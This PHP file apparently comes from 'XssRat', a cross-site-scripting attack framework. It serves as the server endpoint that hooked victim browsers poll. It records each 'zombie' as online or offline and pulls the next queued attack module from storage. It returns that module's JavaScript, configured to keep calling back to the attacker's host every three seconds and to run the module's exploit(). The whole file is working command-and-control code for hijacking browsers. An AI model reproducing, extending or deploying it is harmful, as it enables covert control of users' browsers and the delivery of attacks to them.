<?php
/* 
 * Created on 2014��4��7��
 * @project XssRat
 * @author owlinrye
 * @email blackrat.sec@gmail.com
 * An easy Xss framework
 * 
 * listen the heartbeat from the client
 * 
 */
 
 header("Content-Type: application/javascript; charset=UTF-8");
 header("Connection: close");
 header("Content-Length: 0");
 ob_end_flush();
 
 require_once("../bin/Path.php"); 
 require_once(PHP_BASE_DIR."/db/MySQL.php");
 require_once(PHP_BASE_DIR."/util/util.php");
 require_once(PHP_BASE_DIR."/entity/Project.php");
 require_once(PHP_BASE_DIR."/entity/ProjectModuleData.php");
 require_once(PHP_BASE_DIR."/entity/AttackData.php");
 
 $res = "{}";
 
 if(!empty($_REQUEST["t"])&&!empty($_REQUEST["i"])&&$_REQUEST["i"]!=="null"&&!empty($_REQUEST["s"])){
 	
 	$ticket = $_REQUEST["t"];
 	$pmd_id = $_REQUEST["i"];
 	$stat = $_REQUEST["s"]==="online"?1:0;
 	
 	$db = new MySQL($log);
	if($mysqli = $db->openDB()){
		$pmd = new ProjectModuleData($mysqli,$log);
		$attackData = new AttackData($mysqli,$log);
		//更新客户端状态
		if(!$pmd->updateStatus($pmd_id,$stat)){
			$log->error("update zombie status failed!");
		}
		//发送攻击模块   （队列形式发送）  先进先出
		//更新攻击模块队列的状态  若超时，则判定攻击失败   默认15s超时
		$attackData -> updateAttackStatus($pmd_id,15);
		
		$attack = $attackData->fetchModuleToAttack($pmd_id);

		if($attack){
			$attackData->setStatus($attack['id'],2);
			//读取脚本文件
			$s = new SaeStorage();
			$content = $s->fileExists(SAE_STORAGE_DOMAIN,SAE_MODULES."/".basename($attack['m_path']))?
			$s->read(SAE_STORAGE_DOMAIN,SAE_MODULES."/".basename($attack['m_path']))."\n":"";
			//基本配置
			$end_script = "rat.net.config = { protocol:\"".get_protocol()."\"," .
			"port:".get_port().",host:\"".get_host()."\",api_path:\"".get_page_path()."\"," .
			"interval:3000,ticket:\"".htmlspecialchars($ticket)."\",pmd_id:\"".$pmd_id."\",a_id:\"".$attack['id']."\"};\n";
			//继承module类
			//$end_script .= "rat.extend(true,rat.module.".$attack['m_name'].",rat.module);\n";
			//加载攻击配置
			if(!empty($attack["config"])||trim($attack["config"])!="")  $end_script .= "rat.module.".$attack['m_name'].".init(".$attack["config"].");\n";
			//执行攻击
			$end_script .= "rat.module.".$attack['m_name'].".exploit();\n";
			$res = $content.$end_script;
		}
		
		
		$db -> closeDB();
	}else{
		$log->error("Open database connection failed!");
	}
	
 }
 
 die($res);
 
?>
